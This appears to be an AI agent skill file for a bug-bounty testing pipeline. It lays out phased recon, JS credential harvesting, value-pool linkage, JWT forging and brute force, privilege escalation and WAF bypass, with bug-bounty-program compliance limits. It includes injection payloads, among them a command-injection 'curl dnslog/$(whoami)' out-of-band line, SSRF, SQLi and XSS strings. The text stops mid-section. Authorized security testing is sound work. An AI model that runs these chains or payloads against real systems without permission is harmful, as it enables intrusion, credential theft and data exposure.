---
name: mastermind-bug-bounty
description: >
  Unified offensive security orchestration. v3.1 FUSED: Iron Rules + Safe-First Layering
  + 6-Hook Lifecycle + Value Pool Linkage. JS deep-read -> _endpoint_params.json
  x _leaked_values.json -> linkage. curl-driven. SRC-adapted.
metadata:
  tags: "bug-bounty,pentest,security,api-fuzz,data-linkage,recon,exploit,src"
  category: "offensive-security"
  version: "3.1.0"
  fused_from: "mastermind-bug-bounty v3.0 + vulnforge v0.4.0"
---

# Mastermind Bug Bounty — v3.1 FUSED

> **融合版**: Mastermind 6-Hook 架构 + VulnForge Safe-First 战术 + SRC 合规体系
> 核心: JS deep-read -> endpoint-params x leaked-values -> linkage injection.
> curl-driven. Zero MCP dependency.

---

## 0. Iron Rules (MANDATORY — 最高优先级，不可被任何其他规则覆盖)

1. **Fingerprint First, Test What Matches** — 先指纹后测试，只测技术栈匹配的漏洞类。禁止无指纹盲目扫描。
2. **Safe-First Ordering** — 安全侦察(🟢) → 普通测试(🟡) → 高危探测(🔴) → WAF绕过(最终手段)。先干完所有不会触发WAF的事，数据攒够了再碰高危操作。
3. **Impact > Detection** — 没有证明危害的发现不是漏洞。FOUND ≠ CONFIRMED。未利用成功的发现标记 PENDING_CONFIRMATION。
4. **Response Drives Request (MANDATORY chaining)** — 每个API响应必须挖掘：提取ID/token/key/hash → 注入所有已知端点。响应链式不可跳过。
5. **Log Findings, NEVER Stop** — 确认漏洞后立即记录，然后继续测试。一个洞不是终点。禁止过早出报告。
6. **Quick-Filter Low-Value** — 地图API Key/静态目录列表/Self-XSS/无危害CSRF/版本号泄露 → 一行记录，不进入完整triage。
7. **JWT ↔ 泛查询 闭环链路** — 泛查询拿用户数据 → 提取标识符进JWT爆破 → JWT成功后伪造Token → 用伪造Token测越权 → 扩大泛查询范围。单点是中低危，打通闭环是高危。
8. **中文最终输出 (MANDATORY — 最高优先级)** — 所有用户可见的最终输出必须是中文。漏洞名称双语标注（如 `越权访问 (IDOR)`）。技术术语保留英文。Payload/curl保持原文。报告全文中文。
9. **项目根目录只读** — NEVER在项目根创建.py/.md/.txt/.json。所有产出进 `output/{target_domain}/`。脚本放 `scripts/` 子目录。
10. **最终报告 .docx (MANDATORY)** — Phase 5最终报告必须是 .docx 格式（python-docx生成）。禁止 .md 为最终报告。
11. **Hypothesis vs Confirmation** — 严格区分 `假设（需验证）` vs `已确认（证据: …）`。禁止混淆。
12. **Source Citation** — Payload/CVE引用具体技能文件章节。无法验证 → `[UNABLE TO CITE]`。

---

## 0.1 Safe-First Layering (MANDATORY execution order)

```
━━ 第一层：安全侦察（被动了也不会被封）━━
Phase 0: 指纹+WAF检测+源码泄露搜索
    ↓
Phase 1: JS落盘+API发现+Sub-Path SPA探测
    ↓
━━ 第二层：普通测试（低风险，攒数据）━━
Phase 2: 全接口覆盖+响应挖掘+值池联动+JWT扫描+无认证探测
    ↓
Phase 3: 加密攻击+JWT爆破
    ↓
━━ 第三层：高危探测（数据攒够了，值得冒险）━━
Phase 3.8: 高风险探测 — Swagger/Actuator/Druid + SQLi + CMD + Admin路径
    ↓ (如果WAF封了, Phase 0-3的数据已够写报告)
━━ 第四层 ━━
Phase 4: 403/401 Bypass（条件触发）
    ↓
Phase 5: Exploit → Triage → Report (.docx)
```

**核心原则**: 绿🟢→黄🟡→红🔴 逐层推进。被封之前攒够数据 = 策略成功。

---

## 0.2 FOUND ≠ CONFIRMED (三级分类)

```
每个发现必须分类:

CONFIRMED — 已证明实际危害（能读到不该读的数据/执行不该做的操作/Key能实际利用）
  → 进入报告正文，可标等级（高/中/低）

PENDING  — 检测到信号但不能证明危害
  → 仅入报告附录A（含未确认原因），不入正文和等级

INFO     — 发现但无任何利用可能（版本号/无利用链的安全配置缺失）
  → 仅入报告附录A（安全加固建议）

确认3问（每个FOUND后必须回答）:
  ① 能实际读到什么不该读的数据? → 具体字段名+数据条数
  ② 能实际执行什么不该执行的操作? → 具体操作+结果
  ③ 发现的Key能实际利用吗? → 解密/伪造/登录，至少证明其一

3问全不能 → PENDING
能回答任一 → CONFIRMED
```

---

## 0.3 Non-Vulnerability判定规则（优先级最高 — 以下情况禁止标记为漏洞）

```
规则1: 用自己的有效凭证获取自己的信息 = 正常业务流程，非漏洞
  判定: 必须证明能获取他人数据，或无需认证即可获取
  反例: 无session返回"请登录" → 有认证保护 | 有session返回自己的手机号 → 正常业务

规则2: 接口响应中包含自己的个人信息 ≠ 信息泄露
  必须证明: 响应中包含他人信息，或信息可被未授权访问

规则3: Token/Session仅用于身份校验且随机生成无法预测 → 非泄露
  必须证明(满足其一): token可预测/枚举 | 可被第三方窃取 | 可越权访问他人数据

规则4: 导出/下载接口仅导出自己的数据 = 正常功能
  必须证明: 可导出他人数据，或未授权可导出

规则5: 版本泄露/路径可访问但实际不可用/返回空数组/安全配置缺失单独存在 → 不标漏洞
  必须配合实际攻击场景证明危害
```

---

## 0.4 SRC合规速查

| 禁止 | 合规替代 |
|------|---------|
| 批量拉取（>5条） | ≤5条证明即可 |
| SQLmap / 自动化扫描 | 手工payload: `id=3-1`, `'`, `SLEEP(2)` |
| SQL爆表 | 证明可读（1-2行），不dump |
| SSRF扫内网 | 用SRC靶场；无靶场→问用户 |
| 删/改真实数据 | 仅用自己2个测试账号互操作 |
| alert()弹窗测XSS | `<s>XSS</s>`预检 → `console.log('xss')`确认 |

**XSS预检两步法**: 
1. 注入 `<s>XSS</s>` → 渲染为删除线=HTML被解释，显示原文=被转义
2. 确认: `<img src=x onerror="console.log('xss')">` → F12 Console检查日志

---

## 0.5 L1-L4 Thinking Pyramid

```
L1: Attack Surface ID  → 找到数据与指令交汇点，标记每个输入点
L2: Hypothesis Test   → 构建推理链，每个假设必须有测试
L3: Edge Exploration  → 确认的攻击面上探索边界条件
L4: Defense Inversion → 逆向防御机制找盲区

核心公式:
  Web: Vuln = Source reaches Sink with no effective Sanitizer
  AI:  Vuln = Prompt controllable + Output unfiltered + Tool permissions excessive
```

---

## 1. Pipeline Overview

### 1.1 Fused Pipeline (Safe-First Layered + 6-Phase + 6-Hook)

```
┌──────────────────────────────────────────────────────────────────────────────┐
│                    BUG BOUNTY PIPELINE v3.1 FUSED                              │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  🟢 第一层：安全侦察                                                          │
│  Phase 0: RECON ★基石          Phase 1: API_DISCOVERY                       │
│  ┌──────────────────┐          ┌──────────────────┐                          │
│  │ 技术栈指纹+WAF    │ ───────►│ JS落盘+深度分析   │                          │
│  │ 源码泄露+被动收集  │          │ Sub-Path SPA探测  │                          │
│  │ 雪瞳注入           │          │ API端点+签名提取  │                          │
│  └──────────────────┘          └──────────────────┘                          │
│  产出: _fingerprint.md         产出: _endpoint_params.json                   │
│                                                                              │
│  🟡 第二层：普通测试（攒数据）                                                  │
│  Phase 2: VALUE_LINKAGE ★核心    Phase 3: CRYPTO_ATTACK ★优势                │
│  ┌──────────────────┐          ┌──────────────────┐                          │
│  │ 全接口覆盖测试     │ ───────►│ 加密破解+JWT攻击  │                          │
│  │ 响应挖掘+值池联动  │          │ 签名逆向+密钥爆破 │                          │
│  │ 泛查询+IDOR+XSS预检│         │ Token伪造+越权    │                          │
│  │ 无认证接口全扫     │          │ JWT↔泛查询闭环   │                          │
│  └──────────────────┘          └──────────────────┘                          │
│                                                                              │
│  🔴 第三层：高危探测（条件触发，数据攒够后）                                     │
│  Phase 3.8: HIGH_RISK (条件)                                                │
│  ┌──────────────────┐                                                        │
│  │ Swagger/Actuator  │                                                        │
│  │ SQLi/RCE/SSTI/SSRF│                                                        │
│  │ Admin路径+Host碰撞 │                                                       │
│  │ 垂直越权+导出探测  │                                                        │
│  └──────────────────┘                                                        │
│                                                                              │
│  Phase 4: BYPASS               Phase 5: EXPLOIT ★变现                       │
│  ┌──────────────────┐          ┌──────────────────┐                          │
│  │ 401/403绕过       │ ───────►│ Triage Gate       │                          │
│  │ OAuth/SSO攻击     │          │ PoC链 → 中文报告  │                          │
│  │ CDN回源+缓存投毒  │          │ .docx + 合规声明  │                          │
│  └──────────────────┘          └──────────────────┘                          │
│                                                                              │
│  ┌── Optional ──────────────────┐                                            │
│  │ AI_SECURITY (仅AI/LLM目标)    │                                            │
│  │ MINIPROGRAM (小程序/APP目标)  │                                            │
│  └──────────────────────────────┘                                            │
│                                                                              │
│  ┌──────────────────────────────────────────────────────┐                    │
│  │ 7-HOOK MIDDLEWARE (贯穿全流程):                        │                    │
│  │ 1.Context Injector → 2.Coordinator Guard →            │                    │
│  │ 3.Triage Gate → 3b.Pair Completeness Gate →           │                    │
│  │ 4.Worklog Recorder → 5.Retry Detector →               │                    │
│  │ 6.Handoff Saver                                       │                    │
│  └──────────────────────────────────────────────────────┘                    │
│                                                                              │
│  ★ Cross-Phase Feedback Loop (Phase 3.5) — 发现新Token/ID → 回溯+前推       │
└──────────────────────────────────────────────────────────────────────────────┘
```

### 1.2 Phase → Agent → Skills Mapping

| # | Phase | Layer | Agent | Core Skills | Role |
|---|-------|-------|-------|-------------|------|
| 0 | **RECON** | 🟢 | recon | js_analysis, source_leak, passive_recon, fingerprint | 基石：指纹+WAF+JS |
| 1 | **API_DISCOVERY** | 🟢 | recon | js_analysis, sub_path_spa, miniprogram | 攻击面：JS→端点→签名 |
| 2 | **VALUE_LINKAGE** ★ | 🟡 | api_fuzz | api_fuzz, data_linkage, graphql_test | 核心：值池联动+泛查询+IDOR |
| 3 | **CRYPTO_ATTACK** ★ | 🟡 | crypto_attack | crypto_attack, jwt_attack | 优势：解密+JWT闭环 |
| 3.8 | **HIGH_RISK** | 🔴 | exploit | high_risk_probing, cve_chains | 条件：高危探测 |
| 4 | **BYPASS** | 🔴 | bypass | auth_bypass, oauth_sso | 突破：403/401绕过 |
| 5 | **EXPLOIT** ★ | — | exploit | vuln_classes, race_condition, websocket_test | 变现：Triage→PoC→Report |
| opt | **AI_SECURITY** | — | ai_security | ai_security | 条件：AI/LLM目标 |
| opt | **MINIPROGRAM** | — | recon | miniprogram_analysis | 条件：小程序/APP目标 |

### 1.3 Phase Condition Matrix (条件触发总览)

| Phase | 触发类型 | 何时跳过 |
|-------|---------|---------|
| Phase 0 | **强制** | 从不跳过 — 指纹/WAF/源码是基础 |
| Phase 1 | **强制** | 从不跳过 — JS/API发现是基础 |
| Phase 2 (值池联动) | **强制** | 从不跳过 — 至少对5个参数执行联动注入 |
| Phase 2 (无认证全扫) | **强制** | 扫描必须执行，即使结果为空 |
| Phase 3 (JWT分析) | **条件** | 无JWT → "SKIPPED — no JWT found" |
| Phase 3 (加密分析) | **条件** | 无加密体 → "SKIPPED — no encrypted body" |
| Phase 3.5 (跨阶段反馈) | **强制** | Phase 2+3有发现时强制，无→"SKIPPED — no findings" |
| Phase 3.8 (高危探测) | **条件** | 前序未完成或无中危+发现 → "SKIPPED Phase 3.8" |
| Phase 4 (Bypass) | **条件** | 无403/401 → "SKIPPED — no access barriers" |
| Phase 5 (Report) | **强制** | 从不跳过 — 汇总所有阶段发现生成报告 |

**规则**: 跳过任何事情都要写 `SKIPPED — reason`，不可静默跳过。

---

## 2. Phase 0: RECON — 指纹 + WAF + 源码泄露 ★基石

> See `agents/recon/SKILL.md` + `references/fingerprint-mapping.md`

### ⛔ Mandatory Rules

```
规则 1: 所有 JS 文件下载到本地 downloaded/{domain}/js/
规则 2: 每个文件完整读取（不是只看前N行、不是只搜索关键词）
规则 3: 提取粒度到参数级别：HTTP Method + Content-Type + 参数名(必填/可选) + Auth方式
规则 4: 构建 _endpoint_params.json（不能为空！含 _meta 完整性元数据）
规则 5: 双通道：雪瞳（自动爬取）+ 自主（wayback + DevTools + 页面提取）
规则 6: ⛔ 下载 ≠ 分析 — analyzed: true 标记, completeness ≥ 0.8 才能通过 Gate
```

### Phase 0 Execution Order

```
Step 0 — WAF Detection (MANDATORY, before ANY path probing):
  从响应头识别 WAF/CDN（不主动探测触发封禁）:
    Cloudflare: CF-RAY, __cfuid, Server: cloudflare
    Akamai: X-Akamai-Request-BC, Server: AkamaiGHost
    Imperva: X-Iinfo, visid_incap_*
    AWS CloudFront: X-Amz-Cf-Id, X-Cache: Hit from cloudfront
    阿里云WAF: X-WAF-*, aliws
    腾讯云WAF: stgw_*, TencentCloudWAF
    讯飞自研: iflysec:Herald (Server header)
    Fastly: X-Served-By, X-Cache-Hits

  WAF detected → ALL subsequent probing uses SAFE MODE:
    ① Single request ONLY (no batch/multi-path probing)
    ② 3-5s delay between sensitive path probes
    ③ Never probe >3 admin/actuator paths per minute
    ④ Unknown stack + WAF = skip ALL admin path probing
      → go directly to Phase 1 JS extraction (passive, no WAF trigger)

Step 1 — Tech Stack Fingerprint:
  □ 响应头: Server, X-Powered-By, Set-Cookie name
  □ Cookie: JSESSIONID→Java, PHPSESSID→PHP, ASP.NET_SessionId→.NET
  □ HTML: <div id="app">→Vue, <div id="root">→React, ng-app→Angular
  □ 错误页: "Whitelabel Error Page"→Spring Boot, "Whoops"→Laravel
  □ JS globals: __vue_app__, __webpack_require__
  □ → 记录栈指纹: Java→后续可探Actuator/Swagger/Druid; PHP→.env/admin;
       Python→SSTI/admin/; Node→Prototype Pollution/GraphQL

Step 2 — Source Leak Search (GitHub/Gitee, Phase 0启动，全程后台运行):
  ① 先找厂商组织: search_users("{company_name}") → list_org_repos
  ② 找不到→回退全局搜索: "{domain} password" "{domain} api_key" "{domain} config"
  ③ Gitee同步执行（国内厂商Gitee泄露概率更高）
  ④ 三维度挖掘: commit邮箱提取 + 代码搜索(.env/config.yml) + Issue/PR
  ⑤ 提取到的凭据→记录到凭据清单→Phase 2完成后回注目标系统

Step 3 — Passive Recon (不碰目标，秒级):
  crt.sh子域名 + wayback历史JS + favicon hash
```

### Phase 0 Gate（全部满足才能进入 Phase 1）

```
☐ WAF状态已确认（无WAF / WAF类型 / CDN类型）
☐ 技术栈指纹已记录
☐ GitHub/Gitee搜索结果已写入（至少列出搜索的仓库名和结果摘要）
☐ (If org found): commit email extraction for @{domain}.com started
☐ (If results found): identifiers queued for Phase 2 linkage testing
☐ 如果MCP不可用 → log "SKIPPED — MCP unavailable"
☐ NEVER silently skip
```

---

## 3. Phase 1: API_DISCOVERY — JS深度分析 + 攻击面发现

> See `agents/recon/SKILL.md` + `references/js-analysis.md` + `references/fingerprint-mapping.md`

### Step 0 — JS文件落盘 (MANDATORY)

```
1. 双通道采集:
   通道A: 雪瞳注入 (scripts/snow_eyes_inject.js)
     → 收集 Vue Router路由 + API路径 + 域名/邮箱/Token/AK-SK
   通道B: 自主探测
     → wayback历史JS + 页面<script>提取 + DevTools network

2. 逐个下载到 downloaded/{domain}/js/
3. ⛔ 禁止 "无需下载" 捷径 — JS必须落盘
```

### Step 0.3 — UI全功能点浏览（强制 — 触发SPA懒加载chunk）

```
核心: SPA只在"点击对应功能"时才加载对应的JS chunk。
只加载首页→只收集到首页的JS→漏掉70%+接口。

操作:
1. 逐个点击每个可见的导航项（菜单/选项卡/功能按钮/分页）
2. 每点一下→检查新出现的JS→下载到js/
3. 特别关注: 用户管理/订单/设置/导出/XX管理
4. 下拉菜单/树形菜单→展开所有子项
5. 页面有分页→点击第2页、最后1页
```

### Step 0.5 — Sub-Path SPA探测 (MANDATORY)

```
独立的admin后台SPA常暴露大量管理API，与主站认证体系独立。

WAF防护（先查Phase 0 WAF状态）:
  WAF detected → SAFE MODE: 仅3-6条通用路径，间隔5s
  NO WAF → 可全量探测 ~40条，限速1 req/s

Step 1 — 路径组合探测:
  {base}/admin/ {base}/manage/ {base}/system/ {base}/order/
  {base}/dashboard/ {base}/console/ {base}/backstage/ {base}/boss/
  Stack-specific (Java: /order-system/ /boss/ /platform/)

Step 2 — 独立SPA判定:
  ✅ 返回完整HTML（含<html>/<head>/<body>）→ 独立SPA
  ❌ 返回SPA首页fallback（无独立<script>）→ 非独立SPA

Step 3 — 对每个独立SPA:
  → 提取其JS bundles（不同构建=不同API表面）
  → 注入雪瞳提取路由
  → 独立攻击面运行完整Phase 1-3
```

### Step 1 — JS深度分析

```
对每个JS文件完整读取:
  □ 提取API端点: /api/ /v1/ /v2/ fetch( axios. baseURL
  □ 提取完整请求签名: Method + Content-Type + 参数(必填/可选) + Auth方式
  □ 提取硬编码凭据: apiKey/secretKey/token/AKID/password/JWT Secret
  □ 提取SPA路由: Vue Router / React Router
  □ 提取请求拦截器逻辑（公共参数注入）
  □ 提取加密函数签名（CryptoJS/WebCrypto）

产出: _endpoint_params.json（不允许为空！）
```

### Mini-Program / APP 入口

```
如果目标有微信/支付宝小程序或移动APP:
  → 优先级高于Web JS分析
  → 解包.wxapkg → 审计源码 → 提取ALL APIs + secrets + auth逻辑
  → 然后反哺Web侧测试
  → 详见 references/miniprogram-analysis.md
```

### Phase 1 Gate

```
☐ downloaded/{domain}/js/ 至少包含 1 个 JS 文件
☐ _endpoint_params.json 存在且含 _meta 节
☐ js_files_analyzed > 0（至少一个文件被完整读取）
☐ analysis_completeness ≥ 0.8
☐ total_endpoints_extracted ≥ 3
☐ 每个端点有 method + source_files 字段
☐ Sub-Path SPA探测结果已记录
☐ 硬编码凭据已提取（无则注明 "无硬编码凭据"）
```

---

## 4. Phase 2: VALUE_LINKAGE — 值池联动 + 泛查询 + 无认证探测 ★核心

> See `agents/api_fuzz/SKILL.md` + `skills/data_linkage/SKILL.md`

### ⛔ Core Formula

```
JS 参数需求表 (_endpoint_params.json)
    ×
响应值池 (_leaked_values.json)
    =
自动构造的测试矩阵 → 循环（有饱和度边界）
```

### Execution Order (Safe-First within this Phase)

```
Step 0 — JWT/Token 扫描 (MANDATORY，全量扫描):
  扫描ALL Phase 0+1的响应:
    → grep "eyJ" (JWT), "token", "accessToken", "jwt", "auth"
    → grep headers: Authorization, X-Auth-Token, Set-Cookie
    → For EVERY JWT: decode header→check alg→decode payload→check claims
    → Queue ALL tokens for privilege escalation

Step 0.5 — 响应敏感内容扫描 (MANDATORY):
  扫描ALL响应JSON中敏感字段:
    敏感字段名: password, pwd, secret, token, jwt, privateKey,
               apiKey, smtp, mailPassword, dbPassword, ak, sk
    敏感值模式: eyJ(JWT), AKIA/LTAI/AKID(云密钥),
               邮箱+password同响应, 手机号+name同响应
  → 发现任一→立即记录到 findings

Step 0.6 — 凭证门前无认证接口全扫 (MANDATORY):
  WAF detected → SAFE MODE: 单请求逐条，间隔3-5s，最多10个高价值端点
  NO WAF → 全量扫，限速1 req/s

  ① 对每个端点发一次无Token/无Cookie/无Session请求
  ② 任一返回有效数据(非认证错误)→最高严重漏洞
  ③ 关键端点优先: *ByAccountName, *ByEmail, getUser*, getToken*, */list, */export

Step 0.6.5 — Host头注入检测 (并行):
  检测到密码重置接口→改Host头→看邮件链接域名是否变化
  → 再测 X-Forwarded-Host / X-Host / Forwarded变体

Step 1 — 全接口覆盖测试:
  → 用JS指定的method/auth/Content-Type逐个请求

Step 2 — 响应挖掘:
  → 每个200响应递归提取字段名+值→注入值池

Step 3 — ★ 联动注入（核心）:
  → JS需求表 × 值池 → 自动构造请求 → 新响应 → 回到Step2

Step 4 — 泛查询 §23 + IDOR (Safe-First优先):
  泛查询参数: categoryId置空/%, tenantId置空/%, groupId置空/%
  IDOR: 用值池中的userId/orderId枚举测试

Step 5 — XSS预检 (两步法):
  ① <s>XSS</s> → 检查是否渲染为删除线
  ② <img src=x onerror="console.log('xss')"> → F12 Console确认

Step 6 — 语义Fuzz + 盲区补充（最后做）
```

### 数据联动链路

```
/api/user/list → userId=10086,10087,...
    ↓
/api/user/info?userId=10086 → apiKey=sk-xxx, orgId=42, phone=138****
    ↓
/api/admin/config (X-API-Key: sk-xxx) → 管理配置泄露
    ↓
/api/org/42/members → 更多userId + email + employeeId → 循环

A 返回的参数值 = B 请求的参数输入。
每拿到新值 → 检查哪些接口需要它 → 注入 → 循环
```

### ⛔ 凭证门 (Credential Gate)

```
>80% API需认证且当前无凭据 → 停下来输出:
  "发现 {N} 个需认证API，当前无测试账号。
   请提供测试账号以继续测试。
   如不提供，仅测试 {M} 个公开端点（列表如下）"
→ 等待用户响应 → 拿到凭据后继续 → 禁止重新从Phase 0开始
```

### Phase 2 Gate

```
☐ 全量JWT/Token扫描已完成并写入 findings
☐ 响应敏感内容扫描已完成
☐ 无认证接口全扫已完成（统计可无认证访问的端点数量）
☐ 值池联动至少1轮（3个以上参数在5个以上端点完成配对注入）
☐ 泛查询≥3个参数 (categoryId/tenantId/groupId置空/%)
☐ IDOR≥3个不同ID参数
☐ XSS预检≥2个输入参数
☐ 发现新Token→立即回溯Phase 2分析(JWT)+前推到Phase 3测试(越权)
☐ 凭证门: 如缺凭据已向用户请求
```

---

## 5. Phase 3: CRYPTO_ATTACK — 加密破解 + JWT攻击 ★AI优势

> See `agents/crypto_attack/SKILL.md` + `skills/crypto_attack/SKILL.md` + `skills/jwt_attack/SKILL.md`

JS提取加密签名 → 密钥字典构建 → 批量解密 → 明文回注值池。

**JWT攻击链**: Bearer移除 → alg:none → 密钥爆破 → kid注入 → 声明篡改 → RS256→HS256。

### JWT ↔ 泛查询 闭环链路 (MANDATORY)

```
泛查询拿到其他用户数据 → 提取userId/邮箱/手机号进JWT爆破分支
  → JWT爆破成功后伪造Token
  → 用伪造Token回来测泛查询接口
  → 形成 "泛查询泄露账号 → 账号辅助JWT爆破 → JWT爆破后越权 → 扩大泛查询范围" 闭环

单点突破是中低危，打通闭环是高危
```

---

## 6. Phase 3.5: Cross-Phase Feedback Loop (MANDATORY)

```
Phase 2+3 每发现一个新Token/ID/Key → 自动回溯:

发现JWT Token?
  → BACKTRACK to Phase 2: decode, analyze, forge, test privilege escalation
  → FORWARD: queue for privilege escalation testing

发现新参数名 (accountName)?
  → BACKTRACK to Phase 0: search GitHub/Gitee for this param + "@{domain}"
  → SIDEWAYS: enumerate all endpoints that might accept this parameter

发现新用户标识 (email/phone/employee ID)?
  → BACKTRACK to Phase 0: add to data linkage testing queue
  → BACKTRACK to Phase 2: test on login/password-reset endpoints

发现admin SPA?
  → BACKTRACK to Phase 1: full JS extraction on admin SPA
  → FORWARD: queue admin API for privilege escalation testing

漏洞利用成功?
  → 立即问: "拿到了什么之前拿不到的能力?"
  → 新Token → re-run Phase 2 on all non-admin endpoints
  → Admin级别 → queue for privilege escalation

黄金法则: 留在自己Phase的发现是半个发现
         回溯+前推形成完整攻击链的发现才是完整发现
```

---

## 7. Phase 3.8: HIGH_RISK — 高危探测 (条件触发)

```
╔══════════════════════════════════════════════════════════╗
║  MANDATORY PHASE GATE — ALL items must be checked:     ║
╠══════════════════════════════════════════════════════════╣
║  ☐ Phase 0-1 完整: 指纹+WAF+JS落盘+Sub-Path SPA       ║
║  ☐ Phase 2 完整: 值池联动+无认证扫+敏感扫描            ║
║  ☐ Phase 3 完整: JWT分析+加密攻击(如有)               ║
║  ☐ Phase 3.5 Cross-Phase Feedback 已执行              ║
║  ☐ 已发现 ≥1 个中危+ 漏洞（目标价值确认）              ║
║  ☐ WAF状态已确认: WAF → 全程SAFE MODE(单请求3-5s)    ║
╠══════════════════════════════════════════════════════════╣
║  IF ANY ☐ unchecked → SKIP Phase 3.8 entirely         ║
║  → Log "SKIPPED Phase 3.8 — [reason]"                 ║
║  → Go directly to Phase 5                             ║
╚══════════════════════════════════════════════════════════╝
```

**核心探测 (FOUND≠CONFIRMED, 每项独立)**:

```
☐ 1. Swagger/API Docs: 只测 /api-docs (1次，FOUND→确认端点可访问性)
☐ 2. Admin敏感路径: Java→/actuator | PHP→/.env | Python→/admin/ | .NET→/web.config
☐ 3. SQL注入(手工): id=3-1, keyword=test', SLEEP(2) — 禁止SQLmap
☐ 4. CMD注入: ; sleep 2 / ; ping dnslog.cn
☐ 5. SSTI/SSRF/XXE: ${7*7} / http://127.0.0.1:80 / <!DOCTYPE> OOB
☐ 6. 垂直越权探测: 用已获得Token逐条测试管理端点
☐ 7. 导出接口权限: export/download接口权限测试
☐ 8. Host碰撞: 对403路径测双Host头 → Host: target.com + Host: 127.0.0.1

全部测完后: blocked清单→目标价值HIGH→WAF Bypass(终手段) | blocked→价值LOW→去Phase 5
```

---

## 8. Phase 4: BYPASS — 访问突破

> See `agents/bypass/SKILL.md`

401/403 → 路径操纵 → 方法切换 → Header注入 → 协议降级 → 组合攻击。
CDN识别 → Cache Poisoning → 回源IP探测。
WAF Bypass是最终手段 — 仅当Phase 3.8确认高价值漏洞被WAF阻止时才用。

---

## 9. Phase 5: EXPLOIT — 漏洞变现 ★

> See `agents/exploit/SKILL.md`

### Triage Gate (5+1检查)

```
每个finding必须通过:
  ☐ 1. has_target — URL/端点明确
  ☐ 2. has_vuln_class — 漏洞类型已识别
  ☐ 3. has_evidence — 检测证据可复现
  ☐ 4. impact_demonstrated (HARD GATE) — 已证明实际危害
  ☐ 5. confidence ≥ 0.70 — 置信度达标
  ☐ 6. data_not_public — API返回的数据未在前端UI公开展示

未通过 → 返回深层利用 / PENDING_CONFIRMATION
通过 → POC Generation → Manual Proof → 中文报告(.docx) → SRC合规声明
```

### 报告结构（对齐京东/讯飞/阿里/补天SRC标准）

```
封面 — 报告日期/漏洞类型/自评等级/目标站点/提交平台
目标系统画像 — IP/Web服务器/WAF/SSL/前端框架/API清单/路由表
完整攻击链路图 — ASCII流程图展示所有漏洞因果链
一、漏洞信息 — 名称/URL/类型/等级/受影响资产/测试账号
二、漏洞证明 — 复现环境+完整HTTP请求/响应原文+可复制curl+截图
三、漏洞危害 — 具体泄露数据量(数字)+受影响用户量级+攻击场景
四、修复方案 — P0(立即)/P1(高优)/P2(中优)分级
五、漏洞汇总表 — ID/名称/等级/接口/状态一览表
六、SRC合规声明 — 模板见 references/compliance-rules.md

最终输出: .docx (python-docx生成)，禁止.md为最终报告
```

---

## 10. Discovery Amplification (MANDATORY — 榨干每个端点)

```
核心：找到一个端点=找到一扇门，找到一个参数=找到一把钥匙。
目标是这把钥匙能开的所有门。

🟡 Phase 2 执行（安全）:
1. 拼路径: 发现端点→枚举同类路径 (get*/list*/query*/export*...)
2. 拼参数: 发现参数→在所有已知端点上测试同类参数
3. 响应联动(ACK): 响应有token/accessToken→自动注入非admin端点
6. 数字枚举: 工号/账号名有规律→批量枚举邻居值

🔴 Phase 3.8 执行（条件触发）:
4. 垂直越权: 拿到Token→对全部管理端点逐条测试
5. 导出检测: JS中搜索export/download/excel/csv/report→用Token测权限
```

---

## 11. Core Methodology: JS → Params → Value Pool → Linkage ★

```
┌──────────────────────────────────────────────────────────────────────┐
│                      THE LINKAGE LOOP                                 │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  ① 双通道 JS 采集（雪瞳 + 自主探测）                                  │
│     ↓                                                                │
│  ② 逐文件深度读取 → 完整请求签名提取                                  │
│     → _endpoint_params.json（接口→参数需求映射表）                    │
│     ↓                                                                │
│  ③ 全接口覆盖测试（用 JS 指定的 method/auth/Content-Type）           │
│     → 每个200响应递归挖掘 → _leaked_values.json（参数名→真实值池）   │
│     ↓                                                                │
│  ④ ★ 联动注入：A返回的参数值 → B请求的参数输入                       │
│     JS需求表 × 值池 → 自动构造请求 → 新响应 → 值池增长 → 回到③      │
│                                                                      │
│  并行: 加密破解/JWT攻击/源泄露 → 新增值 → 注入值池 → 回到④           │
│  Cross-Phase Feedback (Phase 3.5): 新Token/ID → 回溯+前推            │
│                                                                      │
│  核心循环（有饱和度边界）:                                             │
│    值池每增加一个值 → 检查 JS 需求表 → 匹配 → 注入 → 新响应 → 增长   │
│    同类参数≤5值, 3轮无高价值增长 → 停止（拿到新权限token后重启）       │
│                                                                      │
│  ★ JWT↔泛查询闭环: 泛查询→用户数据→JWT爆破→伪造Token→越权→扩大泛查询│
└──────────────────────────────────────────────────────────────────────┘
```

---

## 12. Cross-Cutting Capabilities

### 12.1 Multi-Token / Multi-Role Management

```json
// _auth_matrix.json — who can access what
{
  "tokens": {
    "user_10086": {"token": "eyJ...", "role": "user", "userId": 10086},
    "user_admin": {"token": "eyJ...", "role": "admin", "userId": 1,
                    "source": "JWT forged from secret found in JS"}
  },
  "role_coverage": {
    "user": ["/api/user/*", "/api/order/*"],
    "admin": ["/api/admin/*", "/api/export/*", "/api/config/*"]
  }
}
```

**Rule**: For EVERY new token discovered, re-run P0/P1 tests on ALL endpoints from EVERY role's perspective.

### 12.2 OOB Blind Testing

```
OOB优先: dnslog.cn (最快) → Burp Collaborator → interactsh (批量)
SQLi盲注→SLEEP(5) | SSRF→url=http://dnslog.cn | RCE→curl dnslog/$(whoami)
```

### 12.3 Semantic Diff

不仅比较响应大小，比较响应语义: HTTP状态码差异 + JSON key差异 + 敏感字段值变化 + 错误信息泄露

### 12.4 Rate-Limiting & Survival

```
无WAF: 端点间200-500ms, QPS≤3
有WAF: 端点间3-8s, 高价值端点间隔更大
429: 读Retry-After→等待→重试1次→还429标记跳过
403: 停120秒→换账号/IP→测1个安全端点→持续403就停止
核心: 被WAF封之前攒够数据 = 策略成功
```

### 12.5 值池消费队列 + Method Fallback 穷举

值池状态机: pending → consuming → consumed
非2xx触发 Method×ContentType 穷举 (最多12种组合)

---

## 13. 7-Hook System

| # | Hook | When | Action |
|---|------|------|--------|
| 1 | Context Injector | Session start | Load hunt state + worklog + handoff |
| 2 | Coordinator Guard | Pre-tool | Rate-limit + delegation SOFT WARN |
| 3 | Triage Gate (+data_not_public) | Pre-report | 6-check HARD GATE |
| 3b | Pair Completeness Gate ★ | Phase transition | Block if unconsumed values exist |
| 4 | Worklog Recorder | Post-tool | Dual-channel: JSONL + Markdown |
| 5 | Retry Detector | Post-agent | Surrender detection → bypass injection (max 3) |
| 6 | Handoff Saver | Session end | Full state serialization |

---

## 14. Quick Reference

### 14.1 Unified Attack Chain

```
双通道JS采集→深度读取→完整请求签名→_endpoint_params.json
    ↓
全接口覆盖→响应挖掘→_leaked_values.json
